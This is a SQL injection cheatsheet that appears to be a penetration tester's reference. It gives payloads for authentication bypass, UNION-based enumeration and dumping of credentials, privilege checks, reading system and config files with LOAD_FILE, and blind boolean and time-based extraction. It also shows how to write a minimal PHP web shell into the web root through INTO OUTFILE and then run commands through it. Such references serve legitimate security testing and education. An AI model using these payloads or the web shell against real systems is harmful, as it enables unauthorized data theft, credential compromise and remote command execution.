# SQL Injection Cheatsheet

A structured reference for SQL injection techniques, payloads, and enumeration strategies.

**References:**
- [PayloadsAllTheThings – SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass)
- [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

---

## Table of Contents

- [Methodology](#methodology)
- [MySQL Operator Precedence](#mysql-operator-precedence)
- [Comment Syntax](#comment-syntax)
- [Authentication Bypass](#authentication-bypass)
- [Union-Based Injection](#union-based-injection)
  - [Column Enumeration](#column-enumeration)
  - [Data Extraction](#data-extraction)
  - [Multi-Value Retrieval](#multi-value-retrieval)
- [Database Enumeration](#database-enumeration)
  - [Version Fingerprinting](#version-fingerprinting)
  - [Schema & Table Discovery](#schema--table-discovery)
  - [Oracle-Specific Enumeration](#oracle-specific-enumeration)
  - [Privilege Enumeration](#privilege-enumeration)
- [File Read / Write](#file-read--write)
  - [Prerequisites](#prerequisites)
  - [Reading Files](#reading-files)
  - [Writing Files](#writing-files)
  - [Writing a Web Shell](#writing-a-web-shell)
- [Blind SQL Injection](#blind-sql-injection)
  - [Boolean-Based Blind](#boolean-based-blind)
  - [Time-Based Blind](#time-based-blind)

---

## Methodology

A repeatable process for finding and exploiting SQLi.

### Steps for a SQLi PoC

1. **Identify injectable points** — Find input fields or URL parameters that interact with the database.
2. **Inject SQL syntax** — Add characters like `'`, `"`, `OR 1=1`, `--`, etc. and observe if the application responds unexpectedly.
3. **Observe responses** — Errors, different output, or delays all indicate potential vulnerability.
4. **Determine the query structure** — Think about what the back-end query is doing (login check? search? display row?).
5. **Enumerate** — Use the workflow: **version → current DB → databases → tables → columns → data**.

### Recon Tips

- Look at the URL and its parameters — they may hint at the query structure.
- Read the page content carefully; it may reveal column names or data types.
- Try poking with `'` first. If it breaks, try `'--` to see if commenting restores it.
- Use `ORDER BY` to count columns before attempting `UNION`.
- Some characters or operators may be **filtered** by the application or WAF. If `-- ` causes an error but `#` works, the backend is MySQL and the comment style matters. Adjust accordingly.
- Try to understand what **DBMS is in use** before sending payloads — syntax differs across MySQL, MSSQL, Oracle, and PostgreSQL.

### Quick Reference

| Goal | Payload Example |
|------|----------------|
| Test for vulnerability | `'` |
| Confirm injectable | `' OR 1=1-- -` |
| Count columns | `' ORDER BY 1-- -` (increment until error) |
| Find output columns | `' UNION SELECT NULL,NULL,NULL-- -` |
| Get DB version | `' UNION SELECT @@version,NULL-- -` |
| Get current DB | `' UNION SELECT database(),NULL-- -` |
| List all DBs | `' UNION SELECT schema_name,NULL FROM INFORMATION_SCHEMA.SCHEMATA-- -` |
| List tables | `' UNION SELECT TABLE_NAME,NULL FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='x'-- -` |
| List columns | `' UNION SELECT COLUMN_NAME,NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='x'-- -` |
| Dump data | `' UNION SELECT col1,col2 FROM db.table-- -` |

---

## MySQL Operator Precedence

Useful when crafting or reasoning about complex injection payloads.

| Priority | Operators |
|----------|-----------|
| 1 (highest) | `/` `*` `%` |
| 2 | `+` `-` |
| 3 | `=` `>` `<` `<=` `>=` `!=` `LIKE` |
| 4 | `NOT` (`!`) |
| 5 | `AND` (`&&`) |
| 6 (lowest) | `OR` (`\|\|`) |

---

## Comment Syntax

Comments truncate the remainder of the original query after your injection.

| Database | Syntax |
|----------|--------|
| MySQL | `-- -` &nbsp; `#` &nbsp; `/*comment*/` |
| MSSQL / Oracle | `--` |
| PostgreSQL | `--` &nbsp; `/*comment*/` |

> **Note:** MySQL requires a space after `--`. The `-- -` form (dash dash space dash) is common in payloads to ensure the space survives URL encoding. The `#` shorthand works only in MySQL.

---

## Authentication Bypass

These payloads manipulate `WHERE` clauses to always evaluate as true.

| Payload | Technique |
|---------|-----------|
| `' OR 1=1-- -` | Always-true condition |
| `' OR '1'='1` | String comparison bypass |
| `admin'-- -` | Comment out password check entirely |
| `admin')-- -` | Bypass with closing parenthesis + comment |
| `administrator'-- -` | Eliminates `AND password = '...'` clause |
| `administrator' OR 1=1-- -` | Combined username guess + always-true |

> **How it works:** A vulnerable query like `SELECT * FROM users WHERE username='INPUT' AND password='...'` becomes trivially bypassable when the `AND password` clause is commented out or overridden with an always-true condition.

---

## Union-Based Injection

`UNION` injection appends a second `SELECT` to the original query, piggybacking attacker-controlled data into the application's response.

**Requirements:**
- The injected `SELECT` must return the **same number of columns** as the original.
- Column data types must be **compatible** (use `NULL` when unsure — it is compatible with any type).

### Column Enumeration

**Method 1 — ORDER BY (increment until error):**
```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -   -- error here → 2 columns
```

**Method 2 — UNION NULL (add NULLs until no error):**
```sql
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
```

**Method 3 — UNION with integers (visible in response):**
```sql
' UNION SELECT 1,2,3-- -
' UNION SELECT 1,2,3,4-- -
```
Numbers visible in the response identify which column positions are rendered — those are your output columns.

### Data Extraction

Once the column count is known, find which column accepts strings, then pull data.

**Identify a string-compatible column:**
```sql
' UNION SELECT NULL,'test_string',NULL-- -
```

**Common extraction payloads:**

| Payload | Data Retrieved |
|---------|----------------|
| `' UNION SELECT 1,@@version,3,4-- -` | Database version |
| `' UNION SELECT 1,database(),2,3-- -` | Current database name |
| `' UNION SELECT 1,user(),3,4-- -` | Current DB user |
| `' UNION SELECT 1,POW(1,1),3,4-- -` | Numeric blind verification |
| `' UNION SELECT username,password FROM users-- -` | Credentials from users table |
| `' UNION SELECT username,2,3,4 FROM passwords-- -` | Passwords table dump |
| `' UNION SELECT 1,username,password,4 FROM dev.credentials-- -` | Cross-database dump |

### Multi-Value Retrieval

When only one output column is available, concatenate multiple fields with a separator.

| Database | Concatenation Syntax |
|----------|----------------------|
| **MySQL / MariaDB** | `CONCAT(col1, '~', col2)` or `col1 \|\| '~' \|\| col2` |
| **Oracle** | `col1 \|\| '~' \|\| col2` |
| **MSSQL** | `col1 + '~' + col2` |
| **PostgreSQL** | `col1 \|\| '~' \|\| col2` |

**Example (Oracle/PostgreSQL):**
```sql
' UNION SELECT username || '~' || password FROM users-- -
```

**Output will look like:**
```
administrator~s3cure
wiener~peter
carlos~montoya
```

---

## Database Enumeration

`INFORMATION_SCHEMA` is a metadata database present in MySQL, MSSQL, and PostgreSQL (not Oracle). It contains information about every database, table, and column on the server.

**Enumeration flow:** databases → tables → columns → data

### Version Fingerprinting

Identify the DBMS type and version first — syntax varies significantly between them.

| Database | Query |
|----------|-------|
| MySQL / MSSQL | `SELECT @@version` |
| Oracle | `SELECT * FROM v$version` |
| PostgreSQL | `SELECT version()` |

**In-band example:**
```sql
' UNION SELECT @@version-- -
' UNION SELECT NULL, banner FROM v$version-- -   -- Oracle
```

**Blind detection (time-based):**
```sql
SELECT SLEEP(5);        -- MySQL
SELECT pg_sleep(5);     -- PostgreSQL
WAITFOR DELAY '0:0:5';  -- MSSQL
```

### Schema & Table Discovery

**List all databases:**
```sql
' UNION SELECT 1,schema_name,3,4 FROM INFORMATION_SCHEMA.SCHEMATA-- -
```

**List tables in a specific database (e.g., `dev`):**
```sql
' UNION SELECT 1,TABLE_NAME,TABLE_SCHEMA,4
FROM INFORMATION_SCHEMA.TABLES
WHERE table_schema='dev'-- -
```
`TABLE_NAME` holds the table name; `TABLE_SCHEMA` shows which database it belongs to.

**List columns in a specific table (e.g., `credentials`):**
```sql
' UNION SELECT 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA
FROM INFORMATION_SCHEMA.COLUMNS
WHERE table_name='credentials'-- -
```

**Dump data from a known table:**
```sql
' UNION SELECT 1,username,password,4 FROM dev.credentials-- -
```

### Oracle-Specific Enumeration

Oracle does not have `INFORMATION_SCHEMA`. Use these alternatives:

**List all tables:**
```sql
SELECT * FROM all_tables
```

**List columns in a table:**
```sql
SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
```

> **Note:** Oracle also requires every `SELECT` to have a `FROM` clause. Use `FROM dual` as a dummy table when you don't need real data: `' UNION SELECT NULL FROM dual-- -`

### Privilege Enumeration

Determine the current user's permissions — relevant before attempting file read/write.

| Payload | Information Retrieved |
|---------|----------------------|
| `SELECT USER()` | Current DB user (function form) |
| `SELECT CURRENT_USER()` | Current DB user (alias) |
| `SELECT user FROM mysql.user` | All users in MySQL |
| `' UNION SELECT 1,user(),3,4-- -` | Current user via UNION |
| `' UNION SELECT 1,super_priv,3,4 FROM mysql.user WHERE user="root"-- -` | Checks `SUPER` privilege |
| `' UNION SELECT 1,grantee,privilege_type,4 FROM information_schema.user_privileges-- -` | All privileges, all users |
| `' UNION SELECT 1,grantee,privilege_type,4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -` | Privileges for specific user |
| `' UNION SELECT 1,variable_name,variable_value,4 FROM information_schema.global_variables WHERE variable_name="secure_file_priv"-- -` | File I/O directory restriction |

---

## File Read / Write

### Prerequisites

Three conditions must all be true before file operations will work:

1. The DB user has the **`FILE` privilege**.
2. MySQL's `secure_file_priv` global variable is **not set to NULL**.
3. The OS user running MySQL has **read/write access** to the target path.

**Checking `secure_file_priv`:**
```sql
SELECT variable_name, variable_value
FROM information_schema.global_variables
WHERE variable_name = "secure_file_priv";
```

| Value | Meaning |
|-------|---------|
| `''` (empty) | Can read/write from **any directory** |
| `/some/path/` | Restricted to that directory only |
| `NULL` | File read/write is **disabled** |

### Reading Files

Use `LOAD_FILE()` — requires `FILE` privilege.

```sql
SELECT LOAD_FILE('/etc/passwd');

' UNION SELECT 1,LOAD_FILE("/etc/passwd"),3,4-- -
```

**Useful targets:**

| Path | Contents |
|------|----------|
| `/etc/passwd` | System users |
| `/etc/hosts` | Host mappings |
| `/var/www/html/index.php` | Web app source code (may reveal DB creds) |
| `/var/www/html/config.php` | DB connection config |
| `/etc/apache2/apache2.conf` | Apache web root config |
| `/etc/nginx/nginx.conf` | Nginx config |

> **Tip:** Reading web app source files via `LOAD_FILE` can expose database credentials, other injectable parameters, or internal logic — worth doing before jumping straight to a shell.

### Writing Files

Use `SELECT INTO OUTFILE`.

**Test write access first:**
```sql
SELECT 'file written successfully!' INTO OUTFILE '/tmp/test.txt';

' UNION SELECT 1,'write test',3,4 INTO OUTFILE '/var/www/html/proof.txt'-- -
```

**Find the web root** if you don't know it — check server configs via `LOAD_FILE`:
- Apache: `/etc/apache2/apache2.conf`
- Nginx: `/etc/nginx/nginx.conf`
- IIS: `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`

> **Warning:** `INTO OUTFILE` will fail if the file already exists, or if the MySQL process user lacks write permission on the target directory.

### Writing a Web Shell

**Minimal PHP web shell:**
```php
<?php system($_REQUEST[0]); ?>
```

**Write it via UNION injection:**
```sql
' UNION SELECT "","<?php system($_REQUEST[0]); ?>","","" INTO OUTFILE '/var/www/html/shell.php'-- -
```

**Execute commands:**
```
http://TARGET/shell.php?0=id
http://TARGET/shell.php?0=whoami
http://TARGET/shell.php?0=cat+/etc/passwd
```

---

## Blind SQL Injection

Blind SQLi occurs when the application is vulnerable but **does not return query results or errors** in the response. Exploitation relies on crafting queries whose true/false outcome or execution time reveals information indirectly.

### Boolean-Based Blind

The application returns a different response (different content, length, or status) depending on whether the injected condition is true or false. Exploit by asking binary yes/no questions.

**Confirm vulnerability:**
```sql
' AND 1=1-- -    -- true → normal response
' AND 1=2-- -    -- false → different/empty response
```

**Extract data one bit/character at a time:**
```sql
-- Is the first character of the database name 'a'?
' AND SUBSTRING(database(),1,1)='a'-- -

-- Is the first character ASCII value > 109?
' AND ASCII(SUBSTRING(database(),1,1)) > 109-- -
```

**Enumerate table existence:**
```sql
' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()) > 0-- -
```

> **Tip:** Boolean blind is slow manually. Use tools like `sqlmap` or write a script to binary-search through character sets.

### Time-Based Blind

No visible difference in the response — instead, a time delay in the response confirms a true condition.

| Database | Time Delay Payload |
|----------|--------------------|
| MySQL | `SLEEP(5)` |
| PostgreSQL | `pg_sleep(5)` |
| MSSQL | `WAITFOR DELAY '0:0:5'` |
| Oracle | `dbms_pipe.receive_message(('a'),5)` |

**Confirm vulnerability:**
```sql
' AND SLEEP(5)-- -                     -- MySQL: 5-second delay = injectable
'; WAITFOR DELAY '0:0:5'-- -           -- MSSQL
' AND 1=1 AND SLEEP(0)-- -             -- baseline (no delay)
```

**Conditional time delay (extract data):**
```sql
-- MySQL: delay 5s if first char of DB name is 's'
' AND IF(SUBSTRING(database(),1,1)='s', SLEEP(5), 0)-- -

-- MSSQL: conditional delay
'; IF (SELECT COUNT(*) FROM users WHERE username='administrator') > 0 WAITFOR DELAY '0:0:5'-- -
```

> **Note:** Time-based blind is the most reliable technique when there is zero output — but it is slow and sensitive to network jitter. Automate with `sqlmap --technique=T` where possible.
